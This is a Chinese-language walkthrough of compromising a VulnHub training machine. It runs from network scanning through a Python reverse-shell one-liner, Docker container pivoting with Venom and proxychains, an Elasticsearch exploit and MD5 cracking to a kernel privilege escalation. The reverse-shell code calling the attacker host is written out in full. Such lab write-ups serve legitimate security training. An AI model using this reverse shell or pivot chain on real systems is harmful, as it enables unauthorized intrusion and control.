靶机地址：

https://www.vulnhub.com/entry/boredhackerblog-social-network,454/

目的：拿到真实机root权限。  
![image-20220322191852488.png](https://image.3001.net/images/20220331/1648720877_62457bede3d0e373806f8.png!small)  
在vm里面打开此文件，输入名字和位置后会自动导入  
![image-20220322192109620.png](https://image.3001.net/images/20220331/1648720899_62457c039feee7c3d5c45.png!small)![image-20220322192123279.png](https://image.3001.net/images/20220331/1648720905_62457c093d0ffe931e764.png!small)  
将网络适配器修改成仅主机模式，与kali攻击机一个模式就行!  
![image-20220322192518779.png](https://image.3001.net/images/20220331/1648721103_62457ccf013c7dd1dafbd.png!small)![image-20220322192550938.png](https://image.3001.net/images/20220331/1648721106_62457cd28f87074df0c10.png!small)  
开启靶机![image-20220322192626123.png](https://image.3001.net/images/20220331/1648721138_62457cf2ebb8ae95f4653.png!small)  
开启kali

因为是在同网段，使用二级扫描arp-scan工具  
![image-20220322192830099.png](https://image.3001.net/images/20220331/1648721180_62457d1c90789ea331062.png!small)

发现三个ip，但只有192.168.2.134这个ip才是靶机ip  
查看本机IP为：192.168.2.129  
![image-20220322193733481.png](https://image.3001.net/images/20220331/1648721267_62457d7399fbad43cb741.png!small)  
使用nmap对192.168.2.134进行端口扫描  
![image-20220322193830625.png](https://image.3001.net/images/20220331/1648721295_62457d8fe13e773f0949f.png!small)  
发现开启了22和5000端口  
进行服务探测  
![image-20220322194008474.png](https://image.3001.net/images/20220331/1648721307_62457d9b3b7238877cce4.png!small)  
22端口ssh服务和5000端口的HTTP服务  
而且后面带的version可以看到是Ubuntu Linux ；  
Werkzeug httpd 0.14.1 (Python 2.7.15)这是一个基于python的底层框架  
用浏览器打开此http服务  
![image-20220322194534202.png](https://image.3001.net/images/20220331/1648721393_62457df1d4a458c040daa.png!small)

简单测试一下有无sql注入之类的漏洞，没有什么结果，既然是网站，就用目录扫描工具dirsearch看看有无后台登录啥的；  
![image-20220322195226881.png](https://image.3001.net/images/20220331/1648721408_62457e004c188f9eb3c38.png!small)  
发现了一个网站，打开  
![image-20220322195401721.png](https://image.3001.net/images/20220331/1648721426_62457e126844397124a11.png!small)  
可以执行代码，之前进行端口服务扫描时，又是python语言写的，就想到用nc链接反弹shell，去百度找一个python的反弹shell的code

import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.129",5555));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

将code中的IP修改成kali的IP，端口号设置一个与本地不冲突的  
![image-20220322200003419.png](https://image.3001.net/images/20220331/1648721458_62457e32e6389f8648f16.png!small)  
先在kali终端开启nc监听  
![image-20220322200139231.png](https://image.3001.net/images/20220331/1648721464_62457e389e95f0eb7e2e3.png!small)  
再在浏览器中点击Test code；

回到终端，已经成功链接  
![image-20220322200252489.png](https://image.3001.net/images/20220331/1648721479_62457e47b811a92e375f6.png!small)  
信息收集一波  
![image-20220322200446482.png](https://image.3001.net/images/20220331/1648721623_62457ed74632e6b561961.png!small)  
主机IP：172.17.0.2

root权限

Linux ab7bce94a9b9 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC
2014 x86_64 Linux

直接一步到位了吗？no no no

通过ls命令，产看文件，发现有Dockerfile文件  
那么这个系统就有代怀疑了，会不会是一个容器系统呢，通过查看有无dockerenv文件
（次要依据），查看/proc/1/cgroup（主要依据）文件内容可判断是一个容器系统  
![image-20220322200717112.png](https://image.3001.net/images/20220331/1648721701_62457f2532f212b8a11d9.png!small)![image-20220322201412120.png](https://image.3001.net/images/20220331/1648722256_624581509476f846ef9c2.png!small)

通过IP我们可以知道是在内网，想个办法探测一下内网的其他主机，可以写一个脚本语句来进行内网主机探测：

for i in $(seq 1 10);do ping -c 1 172.17.0.$i;done

为了方便，只测试前面10个主机IP  
![image-20220323095321151.png](https://image.3001.net/images/20220331/1648722319_6245818f7b69c61ed7b64.png!small)

只有172.17.0.1，172.17.0.2，172.17.0.3三个主机存活

这个时候我们就要做内网穿透了，然后通过代理用工具扫描一下内网主机端口和服务，内网代理我用的工具是Venom，github有。

先解压工具  
![image-20220322202642897.png](https://image.3001.net/images/20220331/1648722405_624581e58a03b9adaf21f.png!small)  
将agent_linux_x64先传到172.17.0.2这台服务器上，

在Venom文件夹下右键打开终端，在这里用python开一个http服务

![image-20220322202959424.png](https://image.3001.net/images/20220331/1648722433_624582011ce4d5bc7ddac.png!small)

回到nc链接终端，用wget将文件下载

![image-20220322203202402.png](https://image.3001.net/images/20220331/1648722472_624582289a7ff9a8ef5d4.png!small)

回到文件夹终端。运行与本机对应版本的软件并设置监听端口

![image-20220322203442370.png](https://image.3001.net/images/20220331/1648722494_6245823e911c34ff3cc94.png!small)

给agent_linux_x64赋予x权限，并运行  
![image-20220322203850742.png](https://image.3001.net/images/20220331/1648722536_62458268099144179486f.png!small)![image-20220322203930753.png](https://image.3001.net/images/20220331/1648722540_6245826c14e5c114d5c73.png!small)  
链接上了，show查看节点，goto链接到节点上

开启socks服务（socks5）  
![image-20220322204100313.png](https://image.3001.net/images/20220331/1648722593_624582a1a5faa18b9bde4.png!small)

现在需要用到代理工具proxychains

编辑proxychains4.conf  
![image-20220322204258378.png](https://image.3001.net/images/20220331/1648722605_624582ad5d7dda030a290.png!small)

到最下面，修改成下图  
![image-20220322204510296.png](https://image.3001.net/images/20220331/1648722693_6245830596a3aaf813e18.png!small)  
保存退出

就可以用nmap扫描了三台存活的主机了(172.17.0.1;172.17.0.2(nc链接的容器）；172.17.0.3）

proxychains nmap -Pn -sT 172.17.0.1

![image-20220323100141081.png](https://image.3001.net/images/20220331/1648722721_62458321156b4e1ed7448.png!small)

扫描服务版本  
![image-20220323100258346.png](https://image.3001.net/images/20220331/1648722745_62458339188ef405d8d04.png!small)

是不是很熟悉？这好像就是最开始扫描出来的主机

挂上代理看看网站是不是一样的  
![image-20220323100653811.png](https://image.3001.net/images/20220331/1648723036_6245845c6aacd5820585f.png!small)  
发现就是那台主机，

再扫描

proxychains nmap -Pn -sT -sV 172.17.0.3  
![image-20220323103829488.png](https://image.3001.net/images/20220331/1648723217_624585110a79aae930ec0.png!small)

发现一个新端口，9200 Elasticsearch，这是一个搜索引擎

看看有没有对应的payload  
![image-20220323104048697.png](https://image.3001.net/images/20220331/1648723387_624585bb14bcfce3d8727.png!small)

将第一个复制下来  
![image-20220323104313515.png](https://image.3001.net/images/20220331/1648723397_624585c512e514fe184c2.png!small)

查看payload内容  
![image-20220323104432313.png](https://image.3001.net/images/20220331/1648723410_624585d2dc8816c1439b5.png!small)

需要使用python2  
![image-20220323110253633.png](https://image.3001.net/images/20220331/1648723422_624585de6ad558776a3f8.png!small)

成功getshell

简单信息收集  
![image-20220323111719689.png](https://image.3001.net/images/20220331/1648723463_6245860749fed3d205891.png!small)  
发现一个密码文档

![image-20220323111752488.png](https://image.3001.net/images/20220331/1648723496_6245862899e7d14a9b2b0.png!small)

是MD5加密，找个在线解密网站试试[MD5免费在线解密破解_MD5在线加密-SOMD5](https://www.somd5.com/)

![image-20220323111939816.png](https://image.3001.net/images/20220331/1648723513_62458639d68c2f77b41e5.png!small)

得到了结果经过尝试，只有john 1337hack才能使用

用ssh去链接

![image-20220323153851371.png](https://image.3001.net/images/20220331/1648723528_6245864831c0b903149b8.png!small)

信息收集  
![image-20220323161925719.png](https://image.3001.net/images/20220331/1648723544_62458658bd0beebece549.png!small)  
普通用户权限，Linux内核版本3.13，提权  
![image-20220323162029175.png](https://image.3001.net/images/20220331/1648723589_62458685e9258ef40a8a6.png!small)

我使用这个linux/local/37292.c ，复制出来

查看源码  
![image-20220323162508809.png](https://image.3001.net/images/20220331/1648723654_624586c6b95c17299fcad.png!small)

发现需要调用gcc 和一个osf-lib.so库文件，并且在/tmp文件夹下运行

但是  
![image-20220323162643135.png](https://image.3001.net/images/20220331/1648723675_624586dbde5047150ad7d.png!small)

没有gcc程序

只能先在攻击机处理，然后再传过去使用

先将文件需要调用gcc的地方删除，然后在进行编译

![image-20220323163226232.png](https://image.3001.net/images/20220331/1648723698_624586f243854444f7e8d.png!small)![image-20220323163237383.png](https://image.3001.net/images/20220331/1648723704_624586f823524aee1846b.png!small)  
在本地查看有无osf-lib.so文件  
![image-20220323163507774.png](https://image.3001.net/images/20220331/1648723715_624587032159ebecc45ce.png!small)

都传过去

![image-20220325103356105.png](https://image.3001.net/images/20220331/1648723730_624587124d8129c026816.png!small)

需要移动到/tmp

![image-20220325103916921.png](https://image.3001.net/images/20220331/1648723791_6245874fd1ec73d9e0fc0.png!small)

给exp加x权限再运行 。./exp

![image-20220325104053576.png](https://image.3001.net/images/20220331/1648723806_6245875e47c14a88261bf.png!small)

成功提权

